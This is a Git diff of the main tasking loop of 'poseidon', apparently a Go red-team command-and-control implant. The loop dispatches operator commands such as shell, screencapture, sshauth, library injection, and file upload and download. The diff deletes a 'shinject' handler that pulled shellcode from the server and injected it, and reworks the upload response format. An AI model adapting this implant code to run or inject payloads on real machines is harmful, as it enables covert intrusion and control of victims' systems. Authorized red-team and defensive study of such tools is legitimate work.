@@ -31,7 +31,6 @@ import (
 	"github.com/xorrior/poseidon/pkg/commands/screencapture"
 	"github.com/xorrior/poseidon/pkg/commands/setenv"
 	"github.com/xorrior/poseidon/pkg/commands/shell"
-	"github.com/xorrior/poseidon/pkg/commands/shinject"
 	"github.com/xorrior/poseidon/pkg/commands/sshauth"
 	"github.com/xorrior/poseidon/pkg/commands/triagedirectory"
 	"github.com/xorrior/poseidon/pkg/commands/unsetenv"
@@ -107,7 +106,6 @@ func main() {
 		"download":         4,
 		"upload":           5,
 		"libinject":           6,
-		"shinject":         7,
 		"ps":               8,
 		"sleep":            9,
 		"cat":              10,
@@ -195,52 +193,26 @@ func main() {
 					break
 				}
 
-				data := profile.GetFile(fileDetails.FileID)
-				if len(data) > 0 {
-					f, e := os.Create(fileDetails.RemotePath)
-
-					if e != nil {
-						profile.PostResponse(task.Tasks[1], e.Error())
-					}
-
-					n, failed := f.Write(data)
-
-					if failed != nil && n == 0 {
-						profile.PostResponse(task.Tasks[1], failed.Error())
-					}
-
-					profile.PostResponse(task.Tasks[1], "File upload successful")
+				result := profile.GetFile(fileDetails)
+				var out = `{}`
+				if result {
+					out = `{"user_output":"file upload successful"}`
+				} else {
+					out = `{"user_output":"file upload failed"}`
 				}
 
+				resultMsg := structs.TaskResponseMessage{}
+				resultSubMsg := structs.Response{}
+				resultSubMsg.Response = []byte(out)
+				resultSubMsg.TaskID = task.Tasks[1].TaskID
+				resultMsg.Responses = append(resultMsg.Responses, resultSubMsg)
+
+				msg, _ := json.Marshal(resultMsg)
+				profile.PostResponse(task.Tasks[1], string(msg))
 				break
 
 			case 6:
 				go libinject.Run(task.Tasks[1], res)
-				break
-
-			case 7:
-				tMsg := &structs.ThreadMsg{}
-				tMsg.TaskItem = task.Tasks[1]
-				args := &shinject.Arguments{}
-				//log.Println("Windows Inject:\n", string(task.Params))
-				err := json.Unmarshal([]byte(task.Tasks[1].Params), &args)
-
-				if err != nil {
-					tMsg.Error = true
-					tMsg.TaskResult = []byte(err.Error())
-					res <- *tMsg
-					break
-				}
-				args.ShellcodeData = profile.GetFile(args.ShellcodeFile)
-
-				//log.Println("Length of shellcode:", len(args.ShellcodeData))
-				if len(args.ShellcodeData) == 0 {
-					tMsg.Error = true
-					tMsg.TaskResult = []byte(fmt.Sprintf("File ID %s content was empty.", args.ShellcodeFile))
-					res <- *tMsg
-					break
-				}
-				go shinject.Run(args, tMsg, res)
 				break
 			case 8:
 				go ps.Run(task.Tasks[1], res)
@@ -268,6 +240,7 @@ func main() {
 					break
 				}
 
+				
 				profile.PostResponse(task.Tasks[1], fmt.Sprintf("changed directory to: %s", task.Tasks[1].Params))
 				break
 			case 12:
